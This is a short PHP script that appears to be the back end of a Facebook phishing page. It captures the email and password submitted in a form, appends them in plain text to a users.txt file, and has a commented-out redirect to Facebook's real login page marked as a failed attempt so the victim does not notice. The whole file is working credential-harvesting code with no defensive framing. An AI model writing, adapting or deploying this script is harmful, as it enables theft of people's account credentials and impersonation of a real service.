<?php
$nombre = $_POST["email"];
$pass = $_POST["pass"];


$texto = "Usuario: " . $nombre . ", Pass: " . $pass;
$texto .= "\n\n";

$acl=fopen('users.txt','a');
fputs($acl,$texto);
fclose($acl);

//header('Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110');

?>